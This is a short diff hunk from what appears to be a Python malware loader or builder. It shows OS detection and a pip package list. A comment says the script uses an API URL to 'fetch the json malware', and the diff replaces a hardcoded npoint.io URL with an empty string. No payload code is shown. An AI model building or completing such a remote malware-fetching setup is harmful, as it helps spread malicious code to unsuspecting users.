@@ -24,7 +24,7 @@ elif OS == "Linux":
     LIN = True
 
 # The API url you used for fetch the json malware
-URL = "https://api.npoint.io/6d59014bde401f7847fd"
+URL = ""
 
 # The pip packages to install
 packages = ["requests"]
